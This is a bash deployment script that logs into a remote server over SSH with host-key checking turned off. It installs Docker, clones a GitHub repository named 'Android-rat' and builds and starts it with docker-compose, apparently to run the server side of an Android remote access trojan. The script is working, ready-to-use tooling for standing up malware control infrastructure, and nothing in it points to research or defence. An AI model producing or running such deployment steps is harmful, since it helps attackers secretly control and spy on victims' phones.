#!/usr/bin/env bash
set -euo pipefail
if [ "$#" -lt 1 ]; then
  echo "Usage: $0 user@host [ssh_key_path]"
  exit 1
fi
TARGET="$1"
SSH_KEY="${2:-$HOME/.ssh/id_rsa}"
REPO="https://github.com/0299jolgue/Android-rat.git"

echo "Deploying to ${TARGET} using SSH key ${SSH_KEY}"

ssh -o StrictHostKeyChecking=no -i "${SSH_KEY}" "${TARGET}" bash -s <<'REMOTE'
set -euo pipefail
sudo apt update
sudo apt install -y git docker.io docker-compose
sudo systemctl enable --now docker
TMPDIR="/tmp/android-rat-deploy"
sudo rm -rf "$TMPDIR"
sudo mkdir -p "$TMPDIR"
sudo chown "$USER":"$USER" "$TMPDIR"
cd "$TMPDIR"
if [ -d android-rat ]; then
  rm -rf android-rat
fi
git clone "https://github.com/0299jolgue/Android-rat.git" android-rat
cd android-rat
# Build and run with docker-compose
sudo docker-compose build --no-cache --pull
# bring up. ensure env file or pass envs via systemd/CI
sudo docker-compose up -d --remove-orphans
REMOTE

echo "Deploy finished. Visit http://<SERVER_IP>/"
